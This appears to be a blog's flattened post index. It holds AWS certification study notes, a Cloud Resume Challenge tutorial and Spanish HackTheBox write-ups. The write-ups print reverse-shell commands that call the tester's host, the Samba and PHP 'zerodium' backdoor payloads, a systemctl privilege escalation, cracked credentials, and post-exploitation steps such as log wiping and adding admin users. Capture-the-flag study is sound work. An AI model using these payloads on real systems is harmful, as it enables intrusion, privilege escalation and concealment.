at the edgeAWS WAF Protect your web from common web exploits(Layer 7 http) Deploy on Application Load Balancer, API Gateway, Cloudfront Define Web ACL (web access control list) Rules include IP addresses, HTTP headers, body or URI strings Protect from SQL injections, XSS, Block countries, or rate based rules (count occurrences of events) DDos Pentesting in AWS AWS customers are welcome to carry out security assessments against their AWS infrastructure without approval for 8 services: Amazon EC2 Amazon RDS Amazon CloudFront Amazon Aurora Amazon API Gateway AWS Lambda Amazon Lightsail resources Amazon Elastic Beanstalk Prohibited: DNS zone walking, Dos, Port flooding, request flooding, DDosEncryption At rest: data stored archived in device Hard disks, RDS service, S3 Glacier Deep archive In transit: data being moved from one location to another Transfer from on-premises to AWS, EC2 to DynamoDB For this we leverage encryption keysAWS KMS Service for encryption: AWS manage the encryption keys for us Encryption Opt-in: EBS volumes S3 buckets: server side encryption of objects Redshift database:encryption of data RDS database. encryption of data EFS drives: encryption of data Automatically enabled: Cloud trail logs S3 Glacier Storage Gateway AWS Certificate Manager (ACM) Lets you easily provision, manage and deploy SSL/TLS Certificates Used to provide in-flight encryption for websites (HTTPS) Supports both public and private TLS certificates, free for ublic TLS Automatic TLS certificate renewal, integrated with ELB, CloudFonrt, APIs on API GatewayAWS Secrets Manager Newer service, storing secrets, capability to force rotation of secrets every X days Automate generation of secrets on rotation (uses lambda) Integration with Amazon RDS and are encrypted using KMSAmazon GuardDuty Intelligent threat discovery to protect AWS Account Uses ML algorithms, anomaly detection, 3rd party data One click to enable (30 days trial), no software to install Input data: Cloud trail logs, VPC flow logs, DNS logs Can setup CloudWatch Event Rules to be notifies in case of finding targeting AWS lambda or SNSAmazon Inspector Automated Security Assessments for EC2 instances Analyze against unintended network accessibility AWS Inspector must be installed on OS in EC2 instancesAWS Config Helps with auditing and recording compliance of your AWS resources Helps record configuration and changes over time Questions solved: is there a unrestricted ssh access to my security groups?, do my buckets have any public access? You can receive notification in changes, is a per-region service and can be across regions and accountsAmazon Macie Fully managed data security and data privacy service that uses ML and pattern matching to protect your sensitive data in AWS Macie helps identify and alert you to sensitive data, such a personally identifiable information (PII)AWS Security Hub Central security tool to manage security across AWS accounts and automate security checks Integrated dashboards sowing current security and compliance status to quickly take actions Automatically aggregates alerts in predefined findings in: GuardDuty, Inspector, Macie, IAM Access, AWS SSM, AWS Firewall, AWS Partner Network Solutions Must first enable AWS config service GuardDuty, Inspector, Macie, IAM Access, AWS SSM, AWS Firewall, AWS Partner Network SolutionsAmazon Detective GuardDuty, Macie and Security Hub are used to identify potential security issues or findings Analyzes, investigates and quickly identifies the root cause of security issues or suspicious activities( using ML and graphs) Automatically collects and processes events from VPC log flows, Cloud Trail, GuardDutiy and create unified viewAWS Abuse Report suspected AWS resources used for abusive or illegal purposes Spam Port Scanning Dos or DDoS Intrusion attempts Hosting copyrighted content Distributing malware Contact the AWS abuse teamSecurity &amp;amp; Compliance Summary Shield: automatic DDoS protecctions + 24/7 support for advanced WAF: firewall to filter incoming requests based on rules KMS: Encryption keys managed by AWS CloudHSM: Hardware encryption, we manage encryption keys AWS Certificate Manager: provision, manage and deploy SSL/TLS Certificates Artifact: Get access to compliance reports such as PCI, ISO GuardDuty: Find malicious behavior with VPC, DNS and CloudTrail Logs Inspector: For EC2 only, find vulnerabilities Config: track config changes and compliance against rules Macie: Find sensitive data in Amazon S3 CloudTrail: track API calls by users within account AWS Security Hub: Gather security findings from multiple AWS accounts Amazon Detective: Report AWS resources for abusive or illegal purposes Root user privileges: change account settings, close AWS account, change or cancel AWS support plan, register as a seller in marketplaceAccount Management, Billing, SupportAWS Organizations Global services, allows to manage multiple AWS accounts Consolidated billing across all accounts Pricing benefits from aggregated usage (discounts for EC2) API available to automate AWS account creation Restrict account privileges using Service Control Policies (SCP) Create accounts per department, per cost center, for better isolation Use tagging standard for billing purposes, enable CloudTrail and CloudWatch log to send to central S3 accountService Control Policies (SCP) Whitelist or blacklist IAM action Applied at the OU or Account level Does not apply to the master account SCP must have an explicit Allow(does not allow anything by default) Restrict access to certain services, enforce PCI compliance by explicitly disabling services)AWS Consolidated Billing Combined Usage:combine the usage across all AWS accounts in AWS Organization to share the volume, pricing and saving plans discounts One Bill : get one bill for all AWS accounts in the org The management account can turn off Reserved Instances discount sharing for any account in the AWS Organization, including itselfAWS Control Tower Easy way to set up and govern a secure and compliant multi-account AWS environment based on best practices Automate the set up of your environment in few clicks Automate ongoing policy management using guardrails Monitor compliance through an interactive dashboard AWS Control tower run on top of AWS Organizations, so work with this servicePricing Models in AWS Pay as you go: pay for what you use, remain agile, meet scale demands Save when you reserve: minimize risks, comply with long term requirements, EC2, DynamoDB,RDS… Pay less by using more: volume-based discounts Pay less as AWS growsFree tier services IAM VPC Consolidated billing Elastic Beanstalk Cloud formation Auto scaling groupsCompute Pricing ServicesEC2 On demand instances: minimun of 60s, pay per second (win/linux) or per hour(other) Reserved instances: up to 75% discount, on demand hourly rate, 1-3 year commitment, all upfront, partial, no Spot instances: up to 90% discount, bid for unused capacity, have risks Dedicated Hosts: on-demand, reservation for 1 or 3 years Savings plans as an alternative to save on sustained usageLambda Pay per call Pay per durationECS EC2 launch type model: no additional fees Pay for AWS resources stored and created in your applicationFargate Pay for vCPU and memory resources allocated to your applications in your containersS3 Storage class, number and size of objects Number and type of requests Data transfer OUT the S3 region, S3 transfer acceleration Similar to EFS (lifecycle rules)EBS Volume type(based on performance) Storage volume in GB per month IOPS, Snapshots, Data transfer (inbound is free)RDS Per hour billing Engine, size, memory class Purchase type: on demand, reserved instances (1 or 3 years) with required up-front No additional charge for backup storage Number of input and output requests per month, Deployment type: single AZ, multiple AZsCloudFront Pricing is different across regions Aggregated for each edge location, then applied to your bill Data transfer out (volume discount), number of https requests Using private IP instead of public ip for good saving and network performance between EC2 Use same AZ for maximum savings ( at the cost of high availability)Saving Plan Commit a certain $ amount per hour for 1-3 years EC2 Saving Plan Up to %72 discount compared to On-Demand Commit to usage of individual instance families in a region Compute Saving Plan Up to 66% discount compared to on-demand Regardless of family, region, size, os, tenancy, compute options EC2, Fargate, Lambda Setup in the AWS Cost Explorer consoleAWS Compute Optimizer Reduce costs and improve performance by recommending optimal AWS resources Use ML to analyze your resources and their utilization CloudWatch metrics Supported resources: EC2 instances, EC2 Auto scaling groups, EBS volumes, Lambda functions Lower your cost up to 25%, recommendation can be exported to S3Billing and Costing ToolEstimating costs in the cloud TCO Calculator: estimate costs saving, comparing on-premise to aws cloud, ideal for executive presentations Simply monthly calculator /pricing calculator: AWS Pricing Calculator, estimate cost for your architecture solutionTracking costs in the cloud Billing dashboard: high level tool, show free tier Cost allocation tags: use cost allocation tags to track your AWS cost on detailed level (AWS generated or user defined), used for organizing resources for departments Cost usages reports: dive deeper into your AWS costs, most comprehensive set of AWS cost and usage, can be integrated with Athena, Redshift and QuickSight Cost explorer: visualize, understand and manage your AWS cost, create custom reports, analyze your data at high level, choose an optimal Saving plan, forecast usage up to 12 monthsMonitoring against costs plan Billing alarms: data metric in Cloud Watch is stored in us-east-1, its for actual costs,not projected costs, intended a simple alarm, not powerful as AWS Budgets Budgets: send alarms when costs exceed the budget, 3 types: usage, costs, reservations Up to 5 SNS notifications per budget, 2 budgets are free, then 0.02 per day or budget AWS Trusted Advisor No need install anything, high level AWS assessment Analyze AWS accounts and provides recommendation on 5 categories: Cost optimization Performance Security Fault tolerance Service Limits Support Plans 7 core checks for Basic and Developer plans S3 bucket permissions Security Groups: specific ports unrestricted IAM Use MFA on root Account EBS Public snapshots RDS Public snapshots Service limits Full checks for Business and Enterprise Support plans Full checks available on the 5 categories Ability to set CloudWatch alarms when reaching limits Programmatic Access using AWS support API AWS Basic Support Plan Customer service and communities : 24/7 access to customer service, documentation, whitepapers and support forums AWS Trusted advisor: 7 core trusted advisor checks AWS personal Health Dashboard: personalized view of health of AWS servicesAWS Developer Support Plan All Basic Support Plan Business hours email access to Cloud Support Unlimited cases - 1 primary contact General guidance &amp;lt; 24 business hours System impaired &amp;lt; 12 business hoursAWS Business Support Plan (24/7) Intended to use if you have production workloads Trusted advisor - full set of checks + API access 24x7 phone, email and chat access to Cloud Support Engineers Unlimited cases - unlimited contacts Production system impaired &amp;lt; 4 hours Production system down &amp;lt; 1 hourAWS Enterprise Support Plan (24/7) Intended to use if you have mission critical workloads Access to a Technical Account Manager (TAM) Concierge Support Team Infrastructure Event Management, Well Architected and Operations Reviews Business-critical system down &amp;lt; 15 minutesAccount Best Practices - Summary Operate multiple accounts using Organizations Use SCP to restrict account power Easily setup multiple account with best-practices with AWS Control Tower Use tags and Cost Allocation Tags for easy management and billing IAM guidelines: MFA, least-privilege, password policy, password rotation Config to record all resources configurations and compliance over time CloudFormation to deploy stacks across accounts and regions Trusted Advisor to get insights, Support Plan adapted to your need Send service Logs and Access Logs to S3 or CloudWatch Logs CloudTrail to record API calls made within your account If yout Account is compromised: change the root password, delete and rotate all the passwords, contact AWS supportBilling and Costing Tool - Summary Compute Optimizer: recommends resources configuration to reduce cost TCO Calculator: from on-premise to AWS Simple Monthly Calculator : cost of service on AWS Billing dashboard: high level overview + free tier dashboard Cost Allocation Tags: tag resources to create detailed reports Cost and Usage reports: most comprehensive billing dataset Cost explorer: View current usage (detailed) and forecast usage Billing alarms: in us-east-1 track overall and per-service billing Budgets: more advances - track usage, costs, RI, and get alerts Savings Plans: easy way to save based on long-terms usage of AWSAdvances IdentityAWS STS (Security Token Service) Enables to create temporary, limited-privileges credentials to access your AWS resources Short-term credential: you configure expiration period Use cases: Identity federation, IAM Roles for cross accounts, IAM roles for EC2Amazon Cognito (simplified) Identify for your Web and Mobile applications users (potentially millions) Instead of creating them an IAM user; your create a user in CognitoMicrosoft Active Directory (AD) Found on any Windows Server with AD Domain Services Database of objects: User Accounts, Computers, Printers, File shares, Security Groups Centralized security management, create account, assign permissionsAWS Managed Microsoft AD Create your own AD in AWS, manage users locally, support MFA Establish ‘trust’ connections with your on-premise ADAD Connector Director Gateway to redirect to on premise AD Users are managed on the on-premise ADSimple AD AD-compatible managed directory on AWS Cannot be joined with on-premise ADAWS Single Sign-On (SSO) Use on-login to access multiple account and 3er party applications Integrated with AWS Organizations and on-premise AS Supports SAML 2.0 markupAdvanced Identity - Summary IAM: Identity Access Management, used for users that you trust and belong to your company Organizations: Manage multiple AWS accounts Security Token Service (STS): temporary, limited privileges credentials to access AWS resources Cognito: create a database of users for your mobile and web applications Directory Services: integrate Microsoft Active Directory in AWS Single Sign On (SSO): one login for multiple AWS accounts and applicationsAWS Well Architected FrameworkOperational ExcellenceSecurityReliabilityPerformance EfficiencyCost Optimization" }, { "title": "Cloud Resume Challenge", "url": "/posts/AWS-Cloud-Resume-Challenge/", "categories": "AWS, Blogging", "tags": "s3, challenge, cloud, aws, resume", "date": "2022-01-10 11:00:00 -0500", "snippet": "Cloud Resume ChallengeSetup AWSCreate your aws accountSetup MFA for your roor accountCreate an IAM userAssign permission (Principle of Least privilege)Setup Vault (https://github.com/99designs/aws-vault)aws-vault add myuser ( ex: aws-vault add dev)aws-vault exex myuser — aws s3 lsSetup S3What is s3: file service useful for storing files usually for host a websiteWhat is AWS SAM: server less application modelwe will create an AWS Lambda (we ignore this for now)Setups sam clisam initsam buildAdd IAM permissions all in full access(Cloud formation, IAM, Lambda, API Gateway)Deploy Samaws-vault exec myuser —no-session — sam deploy –guidedbefore deploy add this resource to your yaml templateMyWebsite:Type: AWS::S3::BucketProperties:BucketName: my-websiteif deploys fails, delete your stack and deploy againaws cloudformation delete-stack --stack-name &amp;lt;&amp;lt;stack-name&amp;gt;&amp;gt;only the first time with the para – guidedAdd S3aws-vault exex myuser — aws s3 lsPush your website to S3use this unified commandsam build &amp;amp;&amp;amp; aws-vault exec my-user --no-session -- sam deployto setup your s3 bucket as websitte edit your yaml file with thisMyWebsite: Type: AWS::S3::Bucket Properties: AccessControl: PublicRead WebsiteConfiguration: IndexDocument: index.html BucketName: my-fantastic-websiteONLY THE FIRST PART BucketPolicy: Type: AWS::S3::BucketPolicy Properties: PolicyDocument: Id: MyPolicy Version: 2012-10-17 Statement: - Sid: PublicReadForGetBucketObjects Effect: Allow Principal: &quot;*&quot; Action: &quot;s3:GetObject&quot; Resource: !Join - &quot;&quot; - - &quot;arn:aws:s3:::&quot; - !Ref MyWebsite - /* Bucket: !Ref MyWebsiteTHIS PART AFTER UPLOAD OUR HTML FILE TO OUR BUCKETThen update your makefile file.PHONY: buildbuild: sam builddeploy-infra: sam build &amp;amp;&amp;amp; aws-vault exec my-user --no-session -- sam deploydeploy-site: aws-vault exec my-user --no-session -- aws s3 sync ./resume-site s3://my-fantastic-websitethen upload your index.htmlmake deploy-siteadd some css for fancy view&amp;lt;head&amp;gt; &amp;lt;style&amp;gt; p { color: red; } &amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;" }, { "title": "HackTheBox Jarvis", "url": "/posts/jarvis-htb/", "categories": "HTB Writeups, Linux Medium", "tags": "web, sqli, systmctl, rce", "date": "2021-11-15 11:00:00 -0500", "snippet": "Machine IP: 10.10.10.143ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientesNmapComo vemos tiene el puerto 80 abierto, que es el http, veremos en el navegador de que se trata y analizaremos la web.WappalyzerUsando la extensión wappalizer para identificar las tecnologías usadas en la web, encontramos que la web está usando phpmyadmin version 4.8Al hacer un poco de research encontramos la siguiente vulnerabilidad phpMyAdmin 4.8.1 - Remote Code Execution (RCE) , que se aprovecha del ejecutar comandos a traves de parametros sql.Este exploit nos pide parametros como contraseña y usuario, pero aun no los tenemos, así que debemos encontrar una forma de encontrar esos credenciales.Haciendo inspección a la pagina encontré una vulnerabilidad de sql injection en la siguiente url http://10.10.10.143/room.php?cod=6Usando la plataforma crackstation pude encontrar la contraseñaMYSQL5 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyouCon esto ya podemos hacer uso del exploit que encontramos en exploitdb con el usuario DBadmin y la password imissyoupython3 forest.py supersecurehotel.htb 80 /phpmyadmin DBadmin imissyou &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.17.58/6968 0&amp;gt;&amp;amp;1&#39; Antes de ejecutar el exploit establecmos un listener con netcat por el puerto 6968Obtenemos una shell como www-dataEscalamiento de privilegiosLuego de obtener acceso a una Shell con el usuario www-data, buscamos que binarios puedes ser ejecutados como usuarios con privilegios.www-data@jarvis:/var/www/html$ sudo -lMatching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.pyVemos que se puede ejecutar el script simpler.py como el usuario pepeer.Leyendo el script nos damos cuenta que ejecuta el comando ping usando la libreria os, esto se logra llamando a ping desde python, pero al hacer esto se pueden ejecutar otros comandos al final de este.Como vemos está validando que no se usen los caracteres especiales, pero para bypassear eso podemos crearnos un archivo y poner dentro nuestro comando para ejecutarnos una reverse shell, quedaría asi:www-data@jarvis:/tmp$www-data@jarvis:/tmp$ echo -e &#39;#!/bin/bash\\n\\nnc -e /bin/bash 10.10.17.58 443&#39; &amp;gt; /tmp/d.shwww-data@jarvis:/tmp$ chmod +x /tmp/d.shwww-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p*********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _/ __| | &#39;_ ` _ \\| &#39;_ \\| |/ _ \\ &#39;__| &#39;_ \\| | | |\\__ \\ | | | | | | |_) | | __/ |_ | |_) | |_| ||___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es***********************************************Enter an IP: $(/tmp/d.sh)Obtenemos una shell como el usuario pepper y obtenemos el user.txtPara escalar privilegios abusé del servicio systemctl que encontré buscando binarios con permisos suid.Systemctl es un servicio se define mediante un archivo. Se utiliza para vincularlo a este , y luego se utiliza de nuevo para iniciar el servicio. Lo que hace el servicio está definido por el archivo.. servicesystemctlsystemd.servicePara explotar este servicio solo seguí los pasos que nos dá la gpina gtfo binsModificaré eso ligeramente para darme una reverse shell como usuario root.cat priv.sh#!/bin/bashnc -e 10.10.17.58 444echo &#39;[Service] Type=oneshotExecStart=/home/pepper/priv.sh[Install]WantedBy=multi-user.target&#39; &amp;gt; esc.servicesystemctl link /home/pepper/esc.servicesystemctl enable --now /home/pepper/esc.serviceroot@kali# nc -lnvp 443Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 10.10.17.58.Ncat: Connection from 10.10.17.58:37160.iduid=0(root) gid=0(root) groups=0(root)Game over!Obtenemos acceso root y el root.txt." }, { "title": "HackTheBox Lame", "url": "/posts/lame-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "injection, smb, cms, rce", "date": "2021-09-08 11:00:00 -0500", "snippet": "EnumeraciónSystem IP: 10.10.10.3Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.Enumeración de servicios Server IP Address Ports Open 10.10.10.3 TCP: 21,22,139,445,3632 Nmap Scan Resultados:Usando el siguiente comando para enumerar las versiones y servicios que corren en cada puerto luego de hacer un escaneo de puertos abiertos.nmap -A -n -Pn -p21,22,139,445,3632 10.10.10.3Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-28 21:12 EDTNmap scan report for 10.10.10.3Host is up (0.12s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to 10.10.14.2| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelIdentificación de vulnerabilidadesComo podemos observar, en el puerto 445 corre la version 3.0.20 de samba, entonces hacemos una búsqueda en searchsploit con el comando searchsploit samba 3.0.20.Para no usar metasploit analizamos el codigo del exploit con el comando searchsploit -x 16320 y encontramos el payload que se aplica en el input del username al momento de logearse.username = &quot;/=`nohup &quot; + payload.encoded + &quot;`&quot;Código de la prueba de concepto: 16320.rbAcceso al sistemaPara poder acceder al sistema ya sabemos que comando tenemos que ejecutar al momento de introducir el usuario en el servicio samba, pero primero debemos saber en que servicios compartidos podemos acceder, para eso ejecutamos el comando smbmap -H 10.10.10.3 y encontramos que el recurso tmp permite leer y escribir, entonces accedemos con el comando smbclient \\\\10.10.10.3\\tmp y escribimos el siguiente comando.Este es el resultado después de acceder al recurso compartido de tmp.logon &quot;/=`nohup nc -e /bin/bash 10.10.14.2 444`&quot;Este payload establecerá una reverse shell en nuestra maquina victima a traves del puerto 443, entonces antes de ejecutar este comando nos ponemos en escucha por este puerto con el comando nc -nlvp 444.Luego hacemos el tratamiento de la tti para obtener una bash interactiva .Finalmente obtenemos acceso como root, y procedemos a buscar el user y root txt.Prueba de obtención del user.txtflag: 7ef6fe278f3e5dbf81838fda2aab55d4Escalamiento de privilegiosAl haber obtenido acceso como usuario de máximos privilegios con el exploit ejecutado, esta fase se omitiráPrueba de obtención del root.txtflag: 4aae3f0d424655df2b0e7585d98844bbTécnicas Post-explotaciónLimpiando nuestros registros de actividades dentro de los logsUsando la herramienta automatizada Covermyass que se basa en un script de shell para cubrir pistas en sistemas UNIX.Técnicas de Hardening Siempre actualice y parchee su software En este método de explotación, aprovechamos las vulnerabilidades divulgadas públicamente que tienen actualizaciones de seguridad y parches disponibles. Los puertos de Samba no deben ser expuestos Utilice un firewall para denegar el acceso a estos servicios desde fuera de la red. Además, restrinja el acceso a su servidor solo a usuarios válidos y deshabilite el acceso WRITE si no es necesario. Gracias por leer y happy hacking!" }, { "title": "HackTheBox Knife", "url": "/posts/knife-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "zerodium, web, cms, rce", "date": "2021-08-28 11:00:00 -0500", "snippet": "Machine IP: 10.10.10.242DATE : 28/08/2021Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientesNmap┌──(j3sm0n㉿kali)-[~]└─$ nmap -sC -sV 10.10.10.242 148 ⨯ 1 ⚙Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 02:03 EDTNmap scan report for 10.10.10.242Host is up (0.11s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Emergent Medical IdeaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.02 secondsComo vemos tiene el puerto 80 abierto, que es el http, veremos en el navegador de que se trata y analizaremos la webWappalyzerUsando la extensión wappalizer para identificar las tecnologías usadas en la web, encontramos que la web está alojado en servidor apache 2.4.41 y está construido en php 8.1.Method 1Al hacer un poco de research encontramos la siguiente vulnerabilidad PHP 8.1.0-dev - ‘User-Agentt’ Remote Code Execution - PHP webapps Exploit , que se aprovecha del backdoor que fue fue dejado en esta version de PHP , haciendo uso del User-Agent, para ejecutar comandos.El siguiente exploit utiliza una puerta trasera para proporcionar un pseudo shell en el host.Method 2Pero para no estar solo ejecutando el exploit y obteniendo una shell así de facil, haremos uso de burpsuite y netcat para establecer una shell reversa en nuestra maquina.Estableciendo un listener en nuestra maquinaBurpSuiteComo ya sabemos que la vulnerabilidad está en agregar el User-Agent, mandaremos al repeater para ejecutar la consulta agregando User-Agentt: zerodiumsystem(&#39;rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip puerto &amp;gt;/tmp/f&#39;); reemplazando la ip y el puerto por tu ip y establecido en netcat, este es un payload sacado de PayloadsAllTheThings, intenté con el netcat normal, pero al parecer la maquina tenia otra versión de netcat y la de busybox me funcionó.Mandamos la consulta y game over, obtenemos una shell con el usuario james y obtenemos el user.txtEscalamiento de privilegiosLuego de obtener acceso a una Shell con el usuario james, ejecutamos el comandosudo -lPara saber que comandos se pueden ejecutar con permisos SUID, esto habilitaría la ejecución con permisos root.Vemos que se puede ejecutar el comando knife con permisos de root, pero no sabemos de que se trata este comando, entonces listaremos las opciones que tiene este comando y encontramos una opción llamada exec que es un comando de ejecución, con el cual se puede invocar una shell.Ejecutamos el comando para invocar una shellsudo /usr/bin/knife exec --exec &quot;exec &#39;/bin/sh -i&#39;&quot;Game over!Obtenemos acceso root y el root.txt.Gracias por leer y happy hacking." }, { "title": "HackTheBox Blue", "url": "/posts/blue-htb/", "categories": "HTB Writeups, Windows Easy", "tags": "eternalblue, metasploit, smb", "date": "2021-08-28 11:00:00 -0500", "snippet": "EnumeraciónSystem IP: 10.10.10.40Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.Enumeración de serviciosThe service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.In some cases, some ports may not be listed. Server IP Address Ports Open 10.10.10.40 TCP: 135,139,445,49154 Nmap Scan Resultados:Usando el siguiente comando para enumerar las versiones y servicios que corren en cada puerto luego de hacer un escaneo de puertos abiertos.nmap -sC -sV -p135,139,445,49154 10.10.10.40 -Pn Nos arroja este resultado:nmap -sC -sV -p135,139,445,49154 10.10.10.40 -Pn Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 15:02 EDTNmap scan report for 10.10.10.40Host is up (0.17s latency).PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)49154/tcp open msrpc Microsoft Windows RPCService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -19m38s, deviation: 34m35s, median: 19s| smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: haris-PC| NetBIOS computer name: HARIS-PC\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-08-01T20:03:27+01:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-08-01T19:03:24|_ start_date: 2021-08-01T16:10:04Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 74.87 secondsEnumerando vulnerabilidades con nmapUsando el siguiente comando para enumerar las vulnerabilidades más comunes que presentan cada servicio, si es que existen.nmap --script vuln 10.10.10.40Nos arroja este resultado:Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 16:24 EDTNmap scan report for 10.10.10.40Host is up (0.29s latency).Not shown: 991 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49156/tcp open unknown49157/tcp open unknownHost script results:|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND| smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx|_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/Nmap done: 1 IP address (1 host up) scanned in 147.18 secondsIdentificación de vulnerabilidadesExplicación de vulnerabilidad:Segun los resultados de nmap podemos observar que es vulnerable a ejecución remota de codigo, revisando el cve en google encontramos el exploit para esta vulnerabilidad.Severidad:Codigo de la prueba de concepto:A continuación se presente el codigo de la prueba de concepto:Acceso al sistemaPara poder acceder al sistema elaboramos un payload que se ejecutará en la maquina victima, lo elaboramos con el siguiente comando con msfvenom y lo guardamos con el nombre shell.exe.msfvenom -p windows/reverse_shell_tcp lhost=tun0 lport=443 -f exe &amp;gt; shell.exeModificando el exploit para crear un usuario guest.Estableciendo los comandos a ejecutar, en este caso enviamos el archivo compilado en formato .exe y ejecutamos el payload generado en la maquina victima.Luego de haber ejecutaco el exploit obtenemos una shell con maximos privilegios (nt/ authority system), entonces podemos observar el user.txt y root.txt.Prueba de obtención del user.txtflag: 4c546aea7dbee75cbd71de245c8deea9Escalamiento de privilegiosAl haber obtenido acceso como usuario de maximos privilegios con el exploit ejecutado, esta fase se omitiráPrueba de obtención del root.txtflag: ff548eb71e920ff6c08843ce9df4e717Tecnicas Post-explotaciónAgregando usuarios con permisos de administrador Podemos crear usuarios con permisos de administrador con el siguiente comando:net user usuario 12345 /addy asignarlos a un grupo el cual sería administrador con el siguiente comando:net localgroup administrator usuario /addDumpeando los hashes de los usuarios para acceder al sistema posteriormente con la tecnica de passthehash. Una vez con el acceso de administrador podemos modificar el UAC para obtener los hashes ntlm de los administradores con crackmapexec y así poder logearnos como administradores solo con el ntlm hash.Tecnicas de Hardening Mantener siempre el software y las ventanas actualizadas con la última versión, las correcciones y los parches para reducir el riesgo de ser comprometido por tales vulnerabilidades. Deshabilitar el servicio SMBV1 del puerto 445 de la maquina o establecer reglas de firewalls para ocultarlo. Gracias por leer, Happy hacking and always try harder!" }, { "title": "HackTheBox Writeup", "url": "/posts/writeup-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "sqli, path hijacking, web, cms", "date": "2021-07-25 11:00:00 -0500", "snippet": "Machine IP : 10.10.10.138DATE : 25/07/2021Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.NmapUsamos el siguiente comando para escanear todos los puertos de una manera rapida.nmap -p- --open -T5 -v -n -Pn 10.10.10.138Posteriormente utilizamos este comando con los puertos del anterior escaneo para saber las versiones de cada servicio.nmap -sC -sV -n -p22,80 -Pn 